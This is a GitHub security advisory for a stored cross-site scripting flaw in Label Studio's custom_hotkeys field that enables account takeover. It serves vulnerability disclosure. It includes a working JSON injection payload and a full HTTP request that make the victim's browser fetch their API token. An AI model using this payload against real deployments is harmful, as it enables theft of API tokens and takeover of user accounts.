# [H] Label Studio is vulnerable to full account takeover by chaining Stored XSS + IDOR in User Profile via custom_hotkeys field

## Summary
Severity: High
Advisory: GHSA-2mq9-hm29-8qch
CVE: CVE-2026-22033
CWE: CWE-285, CWE-79
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-01-12
Source: https://github.com/advisories/GHSA-2mq9-hm29-8qch
Type: github-advisory

## Affected
- PyPI: `label-studio` — affected >=0

## Details
### Prologue

These vulnerabilities have been found and chained by DCODX-AI. Validation of the exploit chain has been confirmed manually. 

### Summary

A persistent stored cross-site scripting (XSS) vulnerability exists in the custom_hotkeys functionality of the application. An authenticated attacker (or one who can trick a user/administrator into updating their custom_hotkeys) can inject JavaScript code that executes in other users’ browsers when those users load any page using the `templates/base.html` template. Because the application exposes an API token endpoint (`/api/current-user/token`) to the browser and lacks robust CSRF protection on some API endpoints, the injected script may fetch the victim’s API token or call token reset endpoints — enabling full account takeover and unauthorized API access. This vulnerability is of critical severity due to the broad impact, minimal requirements for exploitation (authenticated user), and the ability to escalate privileges to full account compromise.

### Details
Within `templates/base.html`, the application renders user-controlled hotkey configuration via the following JavaScript snippet:

```js
var __customHotkeys = {{ user.custom_hotkeys|json_dumps_ensure_ascii|safe }};
```
Here, user.custom_hotkeys is run through json_dumps_ensure_ascii (in `core/templatetags/filters.py`) which performs `json.dumps(dictionary, ensure_ascii=False)`  but does not escape closing `</script>` sequences or other dangerous characters. Because the template uses the `|safe` filter, the output is inserted into the HTML `<script>` context without further escaping.

In `users/api.py`, the *PATCH* endpoint allows updating of `custom_hotkeys`:

```python
user.custom_hotkeys = serializer.validated_data['custom_hotkeys']
user.save(update_fields=['custom_hotkeys'])
```

The serializer allows `<` and `>` characters (e.g., "</script><script>…"), so an attacker can craft a JSON payload via `PATCH /api/users/{id}/:`

```json
{
   "first_name":"poc",
   "last_name":"test",
   "phone":"123",
   "custom_hotkeys":{
      "INJ;</script><script>fetch(`/api/current-user/token`).then(r=>r.json()).then(t=>console.log(t.token))</script><script>/*xx":{
         "key":"x",
         "active":true
      }
   }
}
```
When another user loads a page using templates/base.html (for example `/user/account/` or `/`), the rendered JavaScript includes the injected string, causing closing of the original <script> tag and insertion of malicious `<script>` code. Because the application exposes `/api/current-user/token` ( in GET) which returns the user’s API token and CSRF protection is relaxed for this API path, the malicious script can fetch the token and send it to an attacker-controlled endpoint, thereby enabling account takeover and further API misuse.


### PoC

1. **Login to the application**
- Go to the login page: `GET /user/login/`

2. **Identify your user ID (via API)**
- `GET /api/current-user/whoami`
- In the response JSON you will see your user ID (for example `"id": 123`).
- Note this ID for the next step.

3. Inject a malicious hotkey payload in the PATCH request /api/users/{id}
- Using the user API, send a `PATCH` request to update your `custom_hotkeys`.

Example request

```http
PATCH /api/users/25 HTTP/1.1
Host: 0.0.0.0:8080
Content-Length: 288
sentry-trace: 926224d7bbfb4f0da9f6ebe333744a52-88db4876de60036c-0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
content-type: application/json
baggage: sentry-environment=opensource,sentry-release=1.21.0,sentry-public_key=5f51920ff82a4675a495870244869c6b,sentry-trace_id=926224d7bbfb4f0da9f6ebe333744a52,sentry-sample_rate=0.01,sentry-transaction=%2Fuser%2Faccount,sentry-sampled=false
Accept: */*
Origin: http://0.0.0.0:8080
Referer: http://0.0.0.0:8080/user/account/personal-info
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,it;q=0.7,nl;q=0.6
Cookie: {STRIPPED}
Connection: keep-alive

{
   "first_name":"poc",
   "last_name":"test",
   "phone":"123",
   "custom_hotkeys":{
      "INJ;</script><script>fetch(`/api/current-user/token`).then(r=>r.json()).then(t=>console.log(t.token))</script><script>/*xx":{
         "key":"x",
         "active":true
      }
   }
}
```
Example response
```json
{"id":25,"first_name":"poc","last_name":"test","username":"test","email":"test@dcodx.com","last_activity":"2025-10-24T15:18:18.494398Z","custom_hotkeys":{"INJ;</script><script>fetch(`/api/current-user/token`).then(r=>r.json()).then(t=>alert(t.token))</script><script>/*xx":{"key":"x","active":true}},"avatar":null,"initials":"pt","phone":"123","active_organization":1,"active_organization_meta":{"title":"Label Studio","email":"poc_test_xgd9ce@example.com"},"allow_newsletters":false,"date_joined":"2025-10-24T15:18:18.494532Z"}
```
4. Verify the injected string persists
- Still logged in as your user, go to your account page (e.g., `GET /user/account/`).
- See the alert containing the API access token for the user. In a real world attack this token is sent to the attacker server

### Impact

Exploitation impact:
- Full account takeover of victim user(s).
- Exposure of API tokens granting access to internal/external APIs.
- Unauthorized API access, data exfiltration, token reset or privilege escalation.
- If victim is administrator or privileged user, wide system compromise possible.

Who is impacted:
- All users who load the template and whose session/token is accessible via browser.
- The organization’s application and data.
- Potentially other end-users if cross-user token exfiltration occurs.

## References
- https://github.com/HumanSignal/label-studio/security/advisories/GHSA-2mq9-hm29-8qch
- https://nvd.nist.gov/vuln/detail/CVE-2026-22033
- https://github.com/HumanSignal/label-studio/pull/9084
- https://github.com/HumanSignal/label-studio/commit/ea2462bf042bbf370b79445d02a205fbe547b505
- https://github.com/HumanSignal/label-studio
- https://github.com/HumanSignal/label-studio/releases/tag/nightly
